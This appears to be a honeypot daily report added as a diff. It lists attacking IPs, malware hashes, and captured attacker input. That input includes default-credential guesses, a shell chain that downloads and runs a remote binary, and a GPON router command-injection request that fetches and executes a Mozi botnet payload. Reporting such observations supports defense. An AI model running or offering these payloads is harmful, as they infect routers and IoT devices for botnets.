@@ -1,0 +1,69 @@
+Top 5 IPs for 2024-05-22 :
+
+183.129.178.206
+42.58.168.42
+95.209.157.55
+166.186.196.118
+49.87.177.80
+
+
+Malware Observed:
+
+File name: sshd
+d7f98e379c400c13340781ccb65017c000330824ea26680866b9d3e43d641721
+https://www.virustotal.com/gui/file/d7f98e379c400c13340781ccb65017c000330824ea26680866b9d3e43d641721
+File name: xinetd
+5b195f51d784c4dda0003e36484e2704c6ad8790e574fe867263c1f5c1dbae03
+https://www.virustotal.com/gui/file/5b195f51d784c4dda0003e36484e2704c6ad8790e574fe867263c1f5c1dbae03
+0d3c687ffc30e185b836b99bd07fa2b0d460a090626f6bbbd40a95b98ea70257
+https://www.virustotal.com/gui/file/0d3c687ffc30e185b836b99bd07fa2b0d460a090626f6bbbd40a95b98ea70257
+76ae6d577ba96b1c3a1de8b21c32a9faf6040f7e78d98269e0469d896c29dc64
+https://www.virustotal.com/gui/file/76ae6d577ba96b1c3a1de8b21c32a9faf6040f7e78d98269e0469d896c29dc64
+a1b6223a3ecb37b9f7e4a52909a08d9fd8f8f80aee46466127ea0f078c7f5437
+https://www.virustotal.com/gui/file/a1b6223a3ecb37b9f7e4a52909a08d9fd8f8f80aee46466127ea0f078c7f5437
+d7188b8c575367e10ea8b36ec7cca067ef6ce6d26ffa8c74b3faa0b14ebb8ff0
+https://www.virustotal.com/gui/file/d7188b8c575367e10ea8b36ec7cca067ef6ce6d26ffa8c74b3faa0b14ebb8ff0
+
+
+Commands/exploits observed:
+
+root
+...xc3511
+start
+enable
+config terminal
+system
+linuxshell
+su
+shell
+sh
+cd /tmp || cd /var/ || cd /var/run || cd /mnt || cd /root || cd /;/bin/busybox echo -ne '\x45\x4c\x46'
+/bin/busybox wget;/bin/busybox echo -ne '\x45\x4c\x46'
+cd /tmp || cd /var/ || cd /var/run || cd /mnt || cd /root || cd /; rm -rf i; wget http://192.168.1.1:8088/i; curl -O http://192.168.1.1:8088/i; /bin/busybox wget http://192.168.1.1:8088/i; chmod 777 i || (cp /bin/ls ii;cat i>ii;rm i;cp ii i;rm ii); ./i; echo -e '\x63\x6F\x6E\x6E\x65\x63\x74\x65\x64'
+
+
+POST /GponForm/diag_Form?images/ HTTP/1.1
+Host: 127.0.0.1:80
+Connection: keep-alive
+Accept-Encoding: gzip, deflate
+Accept: */*
+User-Agent: Hello, World
+Content-Length: 118
+
+XWebPageName=diag&diag_action=ping&wan_conlist=0&dest_host=``;wget+http://192.168.1.1:8088/Mozi.m+-O+->/tmp/gpon80;sh+/tmp/gpon80&ipv=0
+
+
+mother
+...fucker
+root
+...666666
+admin
+...54321
+enable
+system
+shell
+sh
+cat /proc/mounts; /bin/busybox QEOCN
+cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox QEOCN
+tftp; wget; /bin/busybox QEOCN
+dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s
